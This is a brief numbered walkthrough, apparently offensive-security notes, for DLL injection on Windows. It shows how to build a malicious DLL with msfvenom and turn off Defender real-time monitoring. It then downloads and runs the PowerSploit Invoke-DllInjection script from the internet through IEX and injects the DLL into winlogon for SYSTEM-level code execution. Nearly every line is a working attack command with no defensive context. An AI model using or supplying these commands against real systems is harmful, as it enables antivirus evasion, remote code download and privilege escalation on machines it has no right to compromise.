1. Create a malicious dll to inject - msfvenom -p windows/x64/exec "cmd=cmd.exe /k" -f dll > mal.dll
2. Run powershell as administrator
3. Disable the antivirus - Set-MpPreference -DisableRealTimeMonitoring $true
4. download the invoke-dllinjection script - IEX (New-object Net.webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1')
5. List running processes - ps
6. Copy a process ID using a system premmition level like winlogon
7. Inject the malicious dll to winlogon by using DLLInjection module - Invoke-DLLInjection -ProcessID [pid] -DLL [malicious DLL path]
8. Check who runs the terminal